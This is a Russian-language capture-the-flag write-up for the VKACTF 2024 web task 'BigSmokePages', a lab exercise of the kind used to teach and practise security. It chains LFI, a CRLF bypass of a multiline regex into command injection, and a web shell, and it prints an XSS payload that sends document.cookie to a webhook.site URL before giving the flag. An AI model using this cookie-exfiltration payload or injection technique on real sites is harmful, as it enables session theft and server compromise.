# Breakfast

|   Cобытие   | Название | Категория | Сложность |
| :---------: | :------: | :-------: | :-------: |
| VKACTF 2024 |  BigSmokePages |  Web  |  Легко  |

## Описание

>Авторы: EGM x Po4est
>
>BigSmoke записывает все свои задачи в блокнот, а потом отправляет их кому-то для проверки. Но зачем???

# Решение

1. На ручке view_file.php, находим lfi в параметре file.
2. Находим сорцы нашего сервиса. Видим, что в create_file.php используется ```system("touch ./files/$filename")``` с предварительной проверкой 
```
if (preg_match('/^[a-zA-Z0-9_]{0,30}+$/m', $filename) !== 1) {
        header("Location: error.php");
        exit;
}
```
3. Видим CRLF инъекцию в регулярное выражение и обходим его для выполнения os injection.
4. Заливаем веб шелл и с помощью него в файл ```evil.html``` записываем ```XSS``` нагрузку 
```<img src onerror="window.location.replace('https://webhook.site/<webhook>?a='+document.cookie)">``` 
для получения ```cookie```. 
5. Отправляем боту ссылку ```http://bigsmokepages.vkactf.ru/evil.html``` и ловим на веб хук флаг, находящийся у него в куках.



### Флаг


```
vka{B1G_Smoke_bIg_boSS}
```
